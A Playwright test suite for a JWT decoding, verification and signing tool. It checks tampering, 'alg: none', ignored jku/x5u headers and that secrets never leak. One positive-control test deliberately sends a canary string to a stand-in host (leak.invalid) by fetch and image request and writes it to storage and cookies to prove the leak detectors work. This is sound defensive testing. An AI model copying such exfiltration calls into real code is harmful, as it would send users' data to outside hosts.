import { createHmac } from 'node:crypto'
import {
  expect,
  openApp,
  test
} from './fixtures/utools.js'

const HASH_BY_ALGORITHM = {
  HS256: 'sha256',
  HS384: 'sha384',
  HS512: 'sha512'
}

const DECODE_SECRET = 'jwt-s7-hs256-test-secret-32bytes'
const DECODE_HEADER = {
  alg: 'HS256',
  typ: 'JWT'
}
const DECODE_PAYLOAD = {
  sub: 'synthetic-jwt',
  iss: 'synthetic-issuer',
  aud: ['dev-toolbox'],
  iat: 1763856000,
  exp: 1763863200
}
const DECODE_HEADER_TEXT = JSON.stringify(DECODE_HEADER)
const DECODE_PAYLOAD_TEXT = JSON.stringify(DECODE_PAYLOAD)
const DECODE_SIGNATURE =
  'BueCNudqGR1I1RMMngpDFavWvssYgYwQ84oQTKuMqck'
const DECODE_SIGNING_INPUT = `${base64Url(
  DECODE_HEADER_TEXT
)}.${base64Url(DECODE_PAYLOAD_TEXT)}`
const DECODE_TOKEN = `${DECODE_SIGNING_INPUT}.${DECODE_SIGNATURE}`

const ENCODE_SECRET = 's7-e2e-encoder-secret-synthetic-0001'

test.use({ viewport: { width: 1200, height: 800 } })

function base64Url(value) {
  return Buffer.from(String(value), 'utf8').toString('base64url')
}

function signToken({
  header = { alg: 'HS256', typ: 'JWT' },
  payload = { sub: 'synthetic' },
  secret = ENCODE_SECRET,
  algorithm = 'HS256'
} = {}) {
  const headerText = JSON.stringify(header)
  const payloadText = JSON.stringify(payload)
  const signingInput = `${base64Url(headerText)}.${base64Url(
    payloadText
  )}`
  const signature = createHmac(
    HASH_BY_ALGORITHM[algorithm],
    secret
  )
    .update(signingInput)
    .digest('base64url')
  return {
    token: `${signingInput}.${signature}`,
    headerText,
    payloadText,
    signingInput,
    signature
  }
}

function unsignedToken(header, payload, signature = 'c2ln') {
  return `${base64Url(JSON.stringify(header))}.${base64Url(
    JSON.stringify(payload)
  )}.${signature}`
}

function attachCollectors(page) {
  const consoleEntries = []
  const pageErrors = []
  const requests = []
  const websockets = []

  page.on('console', (message) => {
    consoleEntries.push({
      type: message.type(),
      text: message.text()
    })
  })
  page.on('pageerror', (error) => {
    pageErrors.push(error.message)
  })
  page.on('request', (request) => {
    requests.push({
      url: request.url(),
      method: request.method(),
      postData: request.postData()
    })
  })
  page.on('websocket', (socket) => {
    websockets.push(socket.url())
  })

  return { consoleEntries, pageErrors, requests, websockets }
}

async function installLeakRecorders(context) {
  await context.addInitScript(() => {
    const calls = {
      storageSet: [],
      storageRemove: [],
      storageClear: 0,
      idbOpen: [],
      historyPush: [],
      historyReplace: []
    }
    window.__sensitiveTestCalls = calls

    try {
      const originalSet = Storage.prototype.setItem
      Storage.prototype.setItem = function setItem(key, value) {
        calls.storageSet.push([String(key), String(value)])
        return originalSet.call(this, key, value)
      }
      const originalRemove = Storage.prototype.removeItem
      Storage.prototype.removeItem = function removeItem(key) {
        calls.storageRemove.push(String(key))
        return originalRemove.call(this, key)
      }
      const originalClear = Storage.prototype.clear
      Storage.prototype.clear = function clear() {
        calls.storageClear += 1
        return originalClear.call(this)
      }
      if (indexedDB && typeof indexedDB.open === 'function') {
        const originalOpen = indexedDB.open.bind(indexedDB)
        indexedDB.open = (...args) => {
          calls.idbOpen.push(String(args[0]))
          return originalOpen(...args)
        }
      }
      const originalPush = history.pushState.bind(history)
      history.pushState = (...args) => {
        calls.historyPush.push(JSON.stringify(args.slice(0, 2)))
        return originalPush(...args)
      }
      const originalReplace = history.replaceState.bind(history)
      history.replaceState = (...args) => {
        calls.historyReplace.push(JSON.stringify(args.slice(0, 2)))
        return originalReplace(...args)
      }
    } catch {
      // Instrumentation is best-effort; surface scans still run.
    }
  })
}

async function openJwt(page) {
  await openApp(page)
  await page.evaluate(() => {
    window.__utoolsTest.enter({
      code: 'jwt',
      type: 'text',
      payload: 'JWT 工具',
      from: 'main'
    })
  })
  await expect(page.locator('[data-tool="jwt"]')).toBeVisible()
}

async function collectSurfaces(page, context, collectors) {
  const pageSurfaces = await page.evaluate(async () => {
    const attributes = Array.from(document.querySelectorAll('*'))
      .flatMap((element) =>
        Array.from(element.attributes).map(
          (attribute) =>
            `${attribute.name}=${attribute.value}`
        )
      )
      .join('\n')
    let indexedDatabases = []
    try {
      indexedDatabases = await indexedDB.databases()
    } catch {
      indexedDatabases = []
    }

    const storageEntries = (storage) => {
      const entries = {}
      try {
        for (let index = 0; index < storage.length; index += 1) {
          const key = storage.key(index)
          entries[key] = storage.getItem(key)
        }
      } catch {
        return { unavailable: true }
      }
      return entries
    }

    return {
      href: location.href,
      title: document.title,
      historyState: history.state,
      name: window.name,
      localStorage: storageEntries(localStorage),
      sessionStorage: storageEntries(sessionStorage),
      indexedDatabases: indexedDatabases.map(
        (database) => database.name
      ),
      sensitiveCalls: window.__sensitiveTestCalls,
      visibleErrors: Array.from(
        document.querySelectorAll('[role="alert"]')
      ).map((element) => element.textContent),
      bodyText: document.body.innerText,
      attributes
    }
  })
  const utoolsCalls = await page.evaluate(() =>
    window.__utoolsTest.getCalls()
  )
  const cookies = await context.cookies()

  return {
    ...pageSurfaces,
    utoolsCalls,
    cookies,
    consoleEntries: collectors.consoleEntries,
    pageErrors: collectors.pageErrors,
    requests: collectors.requests,
    websockets: collectors.websockets
  }
}

function normalExternalRequests(collectors) {
  return collectors.requests.filter(
    (request) =>
      !request.url.startsWith('file://') &&
      !request.url.startsWith('data:')
  )
}

function expectNoConsoleOrPageErrors(collectors) {
  expect(collectors.pageErrors).toEqual([])
  expect(collectors.consoleEntries).toEqual([])
}

async function expectNoPageOverflow(page) {
  const metrics = await page.evaluate(() => ({
    documentWidth: document.documentElement.scrollWidth,
    viewportWidth: document.documentElement.clientWidth,
    bodyWidth: document.body.scrollWidth
  }))

  expect(metrics.documentWidth).toBeLessThanOrEqual(metrics.viewportWidth)
  expect(metrics.bodyWidth).toBeLessThanOrEqual(metrics.viewportWidth)
}

async function expectControlUncovered(locator) {
  await locator.evaluate((element) => {
    element.scrollIntoView({ block: 'center', inline: 'nearest' })
  })
  const box = await locator.boundingBox()
  expect(box).not.toBeNull()
  const point = {
    x: Math.round(box.x + box.width / 2),
    y: Math.round(box.y + box.height / 2)
  }
  const covered = await locator.evaluate((element, position) => {
    let hit = document.elementFromPoint(position.x, position.y)
    while (hit) {
      if (hit === element) return false
      hit = hit.parentElement
    }
    return true
  }, point)

  expect(covered).toBe(false)
  expect(box.x).toBeGreaterThanOrEqual(0)
  expect(box.y).toBeGreaterThanOrEqual(0)
  expect(box.x + box.width).toBeLessThanOrEqual(
    await locator.evaluate(() => window.innerWidth)
  )
  expect(box.y + box.height).toBeLessThanOrEqual(
    await locator.evaluate(() => window.innerHeight)
  )
}

test.beforeEach(async ({ page, context }) => {
  await installLeakRecorders(context)
  await page.route(/^https?:\/\//, (route) => route.abort())
})

test('decodes a pinned JWS with exact text, claims and copy semantics', async ({
  page,
  context
}) => {
  const collectors = attachCollectors(page)
  expect(
    createHmac(
      HASH_BY_ALGORITHM.HS256,
      DECODE_SECRET
    )
      .update(DECODE_SIGNING_INPUT)
      .digest('base64url')
  ).toBe(DECODE_SIGNATURE)

  await openJwt(page)
  expect(
    await page.evaluate(() => document.activeElement?.id)
  ).toBe('jwt-token-input')
  await expect(
    page.getByRole('tab', { name: '解析 / 验证' })
  ).toHaveAttribute('aria-selected', 'true')

  await page.getByLabel('JWT 输入').fill(DECODE_TOKEN)
  await expect(page.getByTestId('jwt-verify-status')).toHaveText('未验证')
  await expect(page.locator('.output-row')).toHaveCount(3)
  await expect(
    page.locator('.output-row__value').nth(0)
  ).toHaveText(DECODE_HEADER_TEXT)
  await expect(
    page.locator('.output-row__value').nth(1)
  ).toHaveText(DECODE_PAYLOAD_TEXT)
  await expect(
    page.locator('.output-row__value').nth(2)
  ).toHaveText(DECODE_SIGNATURE)
  await expect(
    page.locator('.output-row__label').nth(2)
  ).toHaveText('Signature (Base64URL, 32 字节)')
  await expect(page.getByTestId('jwt-verify-status')).not.toHaveText(
    '签名已验证'
  )
  await expect(page.locator('[data-claim="iss"]')).toContainText(
    'synthetic-issuer'
  )
  await expect(page.locator('[data-claim="exp"]')).toContainText(
    '已过期'
  )
  await expect(page.locator('.claims__note')).toContainText(
    '不等于签名验证'
  )

  await page.evaluate(() => window.__utoolsTest.resetCalls())
  for (let index = 0; index < 3; index += 1) {
    await page.locator('.output-row__copy').nth(index).click()
  }
  await expect
    .poll(() =>
      page.evaluate(
        () => window.__utoolsTest.getCalls().copyText
      )
    )
    .toEqual([
      DECODE_HEADER_TEXT,
      DECODE_PAYLOAD_TEXT,
      DECODE_SIGNATURE
    ])

  const surfaces = await collectSurfaces(page, context, collectors)
  const serialized = JSON.stringify(surfaces)
  expect(serialized).not.toContain(DECODE_SECRET)
  expect(serialized).not.toContain(DECODE_TOKEN)
  expect(surfaces.sensitiveCalls.storageSet).toEqual([])
  expect(surfaces.sensitiveCalls.idbOpen).toEqual([])
  expect(surfaces.utoolsCalls.dbGet).toEqual([])
  expect(surfaces.utoolsCalls.dbSet).toEqual([])
  expect(normalExternalRequests(collectors)).toEqual([])
  expect(collectors.websockets).toEqual([])
  expectNoConsoleOrPageErrors(collectors)
})

test('verifies the correct secret and rejects wrong secrets and tampering', async ({
  page
}) => {
  const collectors = attachCollectors(page)
  await openJwt(page)

  await page.getByLabel('JWT 输入').fill(DECODE_TOKEN)
  await page.getByLabel('验证密钥', { exact: true }).fill(DECODE_SECRET)
  await page.getByRole('button', { name: '验证签名' }).click()
  await expect(page.getByTestId('jwt-verify-status')).toHaveText(
    '签名已验证'
  )

  await page
    .getByLabel('验证密钥', { exact: true })
    .fill(`${DECODE_SECRET}-wrong`)
  await expect(page.getByTestId('jwt-verify-status')).toHaveText('未验证')
  await page.getByRole('button', { name: '验证签名' }).click()
  await expect(page.getByTestId('jwt-verify-status')).toHaveText(
    '签名无效'
  )

  const tampered = `${DECODE_TOKEN.slice(0, -1)}A`
  await page.getByLabel('验证密钥', { exact: true }).fill(DECODE_SECRET)
  await page.getByLabel('JWT 输入').fill(tampered)
  await page.getByRole('button', { name: '验证签名' }).click()
  await expect(page.getByTestId('jwt-verify-status')).toHaveText(
    '签名无效'
  )
  await expect(page.locator('.output-row')).toHaveCount(3)

  expect(normalExternalRequests(collectors)).toEqual([])
  expectNoConsoleOrPageErrors(collectors)
})

test('signs in the encoder, verifies the generated JWS and copies it exactly', async ({
  page
}) => {
  const collectors = attachCollectors(page)
  await openJwt(page)
  await page.getByRole('tab', { name: '生成 / 签名' }).click()

  await page.getByLabel('Header JSON').fill(
    '{"alg":"HS256","typ":"JWT"}'
  )
  await page.getByLabel('Payload JSON').fill(
    '{"sub":"e2e-generated","aud":"dev-toolbox"}'
  )
  await page.getByLabel('签名算法').selectOption('HS256')
  await page.getByLabel('签名密钥', { exact: true }).fill(ENCODE_SECRET)
  await page.getByRole('button', { name: '签名并生成' }).click()
  await expect(page.getByTestId('jwt-sign-status')).toHaveText(
    '状态：签名完成'
  )

  const outputValues = page.locator(
    '[data-testid="jwt-generated-output"] .output-row__value'
  )
  await expect(outputValues).toHaveCount(2)
  const generatedToken = await outputValues.nth(0).textContent()
  const generatedSignature = await outputValues.nth(1).textContent()
  const segments = generatedToken.split('.')
  expect(segments).toHaveLength(3)
  expect(segments[2]).toBe(generatedSignature)
  expect(
    createHmac(HASH_BY_ALGORITHM.HS256, ENCODE_SECRET)
      .update(`${segments[0]}.${segments[1]}`)
      .digest('base64url')
  ).toBe(generatedSignature)

  await page.evaluate(() => window.__utoolsTest.resetCalls())
  await page.getByRole('button', { name: '复制 生成的 JWS' }).click()
  await expect
    .poll(() =>
      page.evaluate(
        () => window.__utoolsTest.getCalls().copyText[0] || null
      )
    )
    .toBe(generatedToken)

  await page.getByLabel('Payload JSON').fill('{"sub":"edited"}')
  await expect(page.getByTestId('jwt-sign-status')).toHaveText(
    '状态：未生成'
  )
  await expect(
    page.locator('[data-testid="jwt-generated-output"]')
  ).toHaveCount(0)

  await page.getByRole('tab', { name: '解析 / 验证' }).click()
  await expect(page.getByLabel('JWT 输入')).toHaveValue('')
  await page.getByLabel('JWT 输入').fill(generatedToken)
  await page.getByLabel('验证密钥', { exact: true }).fill(ENCODE_SECRET)
  await page.getByRole('button', { name: '验证签名' }).click()
  await expect(page.getByTestId('jwt-verify-status')).toHaveText(
    '签名已验证'
  )

  expect(normalExternalRequests(collectors)).toEqual([])
  expectNoConsoleOrPageErrors(collectors)
})

test('handles none, RS256, JWE, malformed Base64URL and limits distinctly', async ({
  page
}) => {
  const collectors = attachCollectors(page)
  await openJwt(page)
  const tokenInput = page.getByLabel('JWT 输入')

  await tokenInput.fill(
    unsignedToken({ alg: 'none' }, { sub: 'unsecured' }, '')
  )
  await expect(page.getByTestId('jwt-verify-status')).toHaveText(
    '无签名/不安全'
  )
  await expect(
    page.locator('.output-row__label').last()
  ).toHaveText('Signature (Base64URL, 0 字节)')
  await expect(
    page.getByRole('button', { name: '验证签名' })
  ).toBeDisabled()

  await tokenInput.fill(
    unsignedToken({ alg: 'RS256', typ: 'JWT' }, {})
  )
  await expect(page.getByTestId('jwt-verify-status')).toHaveText(
    '算法不支持'
  )
  await expect(page.getByTestId('jwt-unsupported-note')).toContainText(
    '仅 HS256'
  )

  await tokenInput.fill('a.b.c.d.e')
  await expect(page.getByRole('alert')).toContainText('不支持 JWE')

  const header = base64Url('{"alg":"HS256"}')
  const payload = base64Url('{}')
  await tokenInput.fill(`${header}+.${payload}.c2ln`)
  await expect(page.getByRole('alert')).toContainText(
    'Base64URL 含有非法字符'
  )

  await tokenInput.fill(`${header}.${payload}.${'A'.repeat(8193)}`)
  await expect(page.getByRole('alert')).toContainText(
    'Signature 段超过 8 KiB'
  )

  await tokenInput.fill('a'.repeat(64 * 1024 + 1))
  await expect(page.getByRole('alert')).toContainText(
    'JWT 超过 64 KiB'
  )
  await expect(page.locator('.output-row')).toHaveCount(0)

  expect(normalExternalRequests(collectors)).toEqual([])
  expectNoConsoleOrPageErrors(collectors)
})

test('fails closed when crypto.subtle is absent while decoding remains available', async ({
  page
}) => {
  await page.addInitScript(() => {
    try {
      Object.defineProperty(Crypto.prototype, 'subtle', {
        configurable: true,
        get() {
          return undefined
        }
      })
    } catch {
      // The component still checks at operation time.
    }
    try {
      Object.defineProperty(globalThis.crypto, 'subtle', {
        configurable: true,
        value: undefined
      })
    } catch {
      // Ignore non-configurable browser descriptors.
    }
  })
  const collectors = attachCollectors(page)
  await openJwt(page)

  await page.getByLabel('JWT 输入').fill(DECODE_TOKEN)
  await expect(page.locator('.output-row')).toHaveCount(3)
  await expect(page.locator('.jwt-crypto-note')).toContainText(
    '当前环境不支持 Web Crypto'
  )
  await expect(
    page.getByRole('button', { name: '验证签名' })
  ).toBeDisabled()

  await page.getByRole('tab', { name: '生成 / 签名' }).click()
  await expect(
    page.getByRole('button', { name: '签名并生成' })
  ).toBeDisabled()

  expect(normalExternalRequests(collectors)).toEqual([])
  expectNoConsoleOrPageErrors(collectors)
})

test('ignores jku and x5u header key material without network access', async ({
  page
}) => {
  const collectors = attachCollectors(page)
  const signed = signToken({
    header: {
      alg: 'HS256',
      typ: 'JWT',
      jku: 'https://headers.invalid/jwks.json',
      x5u: 'https://headers.invalid/cert.pem'
    },
    payload: { sub: 'header-key-ignored' },
    secret: ENCODE_SECRET
  })

  await openJwt(page)
  await page.getByLabel('JWT 输入').fill(signed.token)
  await page.getByLabel('验证密钥', { exact: true }).fill(ENCODE_SECRET)
  await expect(page.getByTestId('jwt-header-key-warning')).toContainText(
    '这些字段已忽略'
  )
  await page.getByRole('button', { name: '验证签名' }).click()
  await expect(page.getByTestId('jwt-verify-status')).toHaveText(
    '签名已验证'
  )

  expect(normalExternalRequests(collectors)).toEqual([])
  expect(
    collectors.requests.every((request) =>
      request.url.startsWith('file://')
    )
  ).toBe(true)
  expectNoConsoleOrPageErrors(collectors)
})

test('keeps secrets out of every collected surface and scans token leaks', async ({
  page,
  context
}) => {
  const collectors = attachCollectors(page)
  await openJwt(page)

  const signed = signToken({
    header: { alg: 'HS256', typ: 'JWT', note: 'leak-scan' },
    payload: {
      sub: 'leak-scan',
      claimCanary: 'PAYLOAD_CANARY_s7_e2e'
    },
    secret: DECODE_SECRET
  })
  await page.getByLabel('JWT 输入').fill(signed.token)
  await page.getByLabel('验证密钥', { exact: true }).fill(DECODE_SECRET)
  await page.getByRole('button', { name: '验证签名' }).click()
  await expect(page.getByTestId('jwt-verify-status')).toHaveText(
    '签名已验证'
  )

  for (const copy of await page.locator('.output-row__copy').all()) {
    await copy.click()
  }
  await page.getByLabel('JWT 输入').fill('malformed.invalid.token!')
  await expect(page.getByRole('alert')).toBeVisible()

  const surfaces = await collectSurfaces(page, context, collectors)
  const serialized = JSON.stringify(surfaces)
  expect(serialized).not.toContain(DECODE_SECRET)
  expect(serialized).not.toContain(signed.token)
  expect(
    surfaces.utoolsCalls.copyText.some((value) =>
      value.includes('PAYLOAD_CANARY_s7_e2e')
    )
  ).toBe(true)
  expect(surfaces.bodyText).not.toContain(DECODE_SECRET)
  expect(surfaces.attributes).not.toContain(DECODE_SECRET)
  expect(surfaces.visibleErrors.join('\n')).not.toContain(DECODE_SECRET)
  expect(
    surfaces.utoolsCalls.copyText.some((value) =>
      value.includes(DECODE_SECRET)
    )
  ).toBe(false)
  expect(surfaces.sensitiveCalls.storageSet).toEqual([])
  expect(surfaces.sensitiveCalls.storageRemove).toEqual([])
  expect(surfaces.sensitiveCalls.storageClear).toBe(0)
  expect(surfaces.sensitiveCalls.idbOpen).toEqual([])
  expect(surfaces.utoolsCalls.dbGet).toEqual([])
  expect(surfaces.utoolsCalls.dbSet).toEqual([])
  expect(normalExternalRequests(collectors)).toEqual([])
  expectNoConsoleOrPageErrors(collectors)
})

test('positive control proves the leak collectors detect deliberate leaks', async ({
  page,
  context
}) => {
  const canary = 'LEAK_POSITIVE_CONTROL_s7_e2e_9f31'
  const collectors = attachCollectors(page)
  await openJwt(page)

  await page.evaluate(async (value) => {
    console.log(value)
    console.info(value)
    console.warn(value)
    console.error(value)
    console.debug(value)
    localStorage.setItem('positive-control', value)
    sessionStorage.setItem('positive-control', value)
    document.title = value
    history.replaceState({ canary: value }, '', `#${value}`)
    window.name = value
    window.utools.dbStorage.setItem('positive-control', value)
    window.utools.copyText(value)
    try {
      document.cookie = `positiveControl=${value}`
    } catch {
      // Cookies may be unavailable on file://.
    }

    const alert = document.createElement('p')
    alert.setAttribute('role', 'alert')
    alert.textContent = value
    document.body.append(alert)

    await new Promise((resolve) => {
      const request = indexedDB.open(value)
      request.onsuccess = () => resolve()
      request.onerror = () => resolve()
    })

    const image = new Image()
    image.src = `https://leak.invalid/${encodeURIComponent(value)}`
    document.body.append(image)
    setTimeout(() => {
      throw new Error(value)
    }, 0)
    await fetch('https://leak.invalid/post', {
      method: 'POST',
      body: value
    }).catch(() => {})
  }, canary)

  await page.waitForTimeout(300)
  const surfaces = await collectSurfaces(page, context, collectors)
  const serialized = JSON.stringify(surfaces)

  expect(collectors.consoleEntries.some((entry) =>
    entry.text.includes(canary)
  )).toBe(true)
  expect(collectors.pageErrors.some((message) =>
    message.includes(canary)
  )).toBe(true)
  expect(collectors.requests.some((request) =>
    `${request.url}\n${request.postData || ''}`.includes(canary)
  )).toBe(true)
  expect(surfaces.visibleErrors.join('\n')).toContain(canary)
  expect(serialized).toContain(canary)
  expect(surfaces.utoolsCalls.copyText).toContain(canary)
  expect(surfaces.utoolsCalls.dbSet).toEqual([
    ['positive-control', canary]
  ])
  expect(surfaces.sensitiveCalls.storageSet).toEqual(
    expect.arrayContaining([
      ['positive-control', canary]
    ])
  )
  expect(surfaces.sensitiveCalls.idbOpen).toContain(canary)
  expect(surfaces.title).toBe(canary)
  expect(surfaces.href).toContain(canary)
  expect(surfaces.name).toBe(canary)
  expect(JSON.stringify(surfaces.historyState)).toContain(canary)
})

test('clears state on mode switch, route exit/re-entry and reload', async ({
  page
}) => {
  const collectors = attachCollectors(page)
  await openJwt(page)

  await page.getByLabel('JWT 输入').fill(DECODE_TOKEN)
  await page.getByLabel('验证密钥', { exact: true }).fill(DECODE_SECRET)
  await page.getByRole('button', { name: '验证签名' }).click()
  await expect(page.getByTestId('jwt-verify-status')).toHaveText(
    '签名已验证'
  )

  await page.getByRole('tab', { name: '生成 / 签名' }).click()
  await page.getByRole('tab', { name: '解析 / 验证' }).click()
  await expect(page.getByLabel('JWT 输入')).toHaveValue('')
  await expect(page.locator('.output-row')).toHaveCount(0)

  await page.getByLabel('JWT 输入').fill(DECODE_TOKEN)
  await page.getByLabel('验证密钥', { exact: true }).fill(DECODE_SECRET)
  await page.evaluate(() => window.__utoolsTest.out(false))
  await expect(page.locator('.app-shell')).toHaveAttribute(
    'data-route',
    'empty'
  )
  await page.evaluate(() => {
    window.__utoolsTest.enter({
      code: 'jwt',
      type: 'text',
      payload: 'JWT 工具',
      from: 'main'
    })
  })
  await expect(page.getByLabel('JWT 输入')).toHaveValue('')
  await expect(page.locator('.output-row')).toHaveCount(0)

  await page.getByLabel('JWT 输入').fill(DECODE_TOKEN)
  await page.getByLabel('验证密钥', { exact: true }).fill(DECODE_SECRET)
  await page.reload({ waitUntil: 'load' })
  await expect(page.locator('.app-shell')).toHaveAttribute(
    'data-route',
    'empty'
  )
  await expect(page.locator('[data-tool="jwt"]')).toHaveCount(0)

  expect(normalExternalRequests(collectors)).toEqual([])
  expectNoConsoleOrPageErrors(collectors)
})

test('keeps 320, 375 and 1200 layouts usable without covered controls', async ({
  page
}) => {
  const collectors = attachCollectors(page)
  const longToken = unsignedToken(
    { alg: 'HS256', typ: 'JWT' },
    {
      sub: 'responsive-layout',
      note: `LONG_${'x'.repeat(1200)}`
    },
    'AA'
  )
  await openJwt(page)
  await page.getByLabel('JWT 输入').fill(longToken)
  await expect(page.locator('.output-row')).toHaveCount(3)

  for (const width of [320, 375, 1200]) {
    await page.setViewportSize({ width, height: 800 })
    await expectNoPageOverflow(page)

    const token = page.getByLabel('JWT 输入')
    const secret = page.getByLabel('验证密钥', { exact: true })
    const verify = page.getByRole('button', { name: '验证签名' })
    const copyHandles = page.locator('.output-row__copy')
    await expect(token).toBeVisible()
    await expect(secret).toBeVisible()
    await expect(verify).toBeVisible()
    await expect(page.getByRole('tab', { name: '解析 / 验证' })).toBeVisible()
    await expect(page.getByRole('tab', { name: '生成 / 签名' })).toBeVisible()
    await expect(copyHandles).toHaveCount(3)

    await expectControlUncovered(token)
    await expectControlUncovered(secret)
    await expectControlUncovered(verify)
    for (const handle of await copyHandles.all()) {
      await expectControlUncovered(handle)
    }

    const wrapping = await page
      .locator('.output-row__value')
      .first()
      .evaluate((element) => ({
        overflowWrap: getComputedStyle(element).overflowWrap,
        whiteSpace: getComputedStyle(element).whiteSpace
      }))
    expect(wrapping).toEqual({
      overflowWrap: 'anywhere',
      whiteSpace: 'pre-wrap'
    })
  }

  expect(normalExternalRequests(collectors)).toEqual([])
  expectNoConsoleOrPageErrors(collectors)
})

test('supports keyboard tabs, activation, copy shortcuts, labels and focus', async ({
  page
}) => {
  const collectors = attachCollectors(page)
  await openJwt(page)

  const decodeTab = page.getByRole('tab', { name: '解析 / 验证' })
  const encodeTab = page.getByRole('tab', { name: '生成 / 签名' })
  await decodeTab.focus()
  await page.keyboard.press('ArrowRight')
  await expect(encodeTab).toHaveAttribute('aria-selected', 'true')
  await expect(encodeTab).toBeFocused()
  await page.keyboard.press('ArrowLeft')
  await expect(decodeTab).toHaveAttribute('aria-selected', 'true')
  await expect(decodeTab).toBeFocused()

  await page.getByLabel('JWT 输入').fill(DECODE_TOKEN)
  await page.getByLabel('验证密钥', { exact: true }).fill(DECODE_SECRET)
  const reveal = page.getByRole('button', { name: '显示验证密钥' })
  await page.getByLabel('验证密钥', { exact: true }).focus()
  await page.keyboard.press('Tab')
  await expect(reveal).toBeFocused()
  await page.keyboard.press('Space')
  await expect(
    page.getByRole('button', { name: '隐藏验证密钥' })
  ).toHaveAttribute('aria-pressed', 'true')
  await page.keyboard.press('Space')
  await expect(reveal).toHaveAttribute('aria-pressed', 'false')

  const verify = page.getByRole('button', { name: '验证签名' })
  await page.keyboard.press('Tab')
  await expect(verify).toBeFocused()
  const verifyOutline = await verify.evaluate(
    (element) => getComputedStyle(element).outlineStyle
  )
  expect(verifyOutline).not.toBe('none')
  await page.keyboard.press('Enter')
  await expect(page.getByTestId('jwt-verify-status')).toHaveText(
    '签名已验证'
  )

  await page.evaluate(() => window.__utoolsTest.resetCalls())
  await page.keyboard.down('Alt')
  await page.keyboard.press('Digit1')
  await page.keyboard.up('Alt')
  await expect
    .poll(() =>
      page.evaluate(
        () => window.__utoolsTest.getCalls().copyText[0] || null
      )
    )
    .toBe(DECODE_HEADER_TEXT)

  const status = page.getByTestId('jwt-verify-status')
  await expect(status).toHaveAttribute('role', 'status')
  await expect(status).toHaveAttribute('aria-live', 'polite')
  await expect(status).toHaveAttribute('aria-atomic', 'true')
  await expect(
    page.getByLabel('验证密钥', { exact: true })
  ).toHaveAttribute(
    'autocomplete',
    'new-password'
  )
  await expect(
    page.getByLabel('验证密钥', { exact: true })
  ).toHaveAttribute(
    'autocapitalize',
    'off'
  )
  await expect(
    page.getByLabel('验证密钥', { exact: true })
  ).toHaveAttribute(
    'spellcheck',
    'false'
  )

  await page.getByLabel('JWT 输入').focus()
  const focusedSequence = new Set()
  for (let step = 0; step < 10; step += 1) {
    await page.keyboard.press('Tab')
    const descriptor = await page.evaluate(() => {
      const active = document.activeElement
      if (!active) return 'none'
      return `${active.tagName}:${active.id}:${active.className}`
    })
    focusedSequence.add(descriptor)
  }
  expect(focusedSequence.size).toBeGreaterThan(3)
  expect(
    Array.from(focusedSequence).some((entry) =>
      entry.includes('output-row__copy')
    )
  ).toBe(true)

  expect(normalExternalRequests(collectors)).toEqual([])
  expectNoConsoleOrPageErrors(collectors)
})
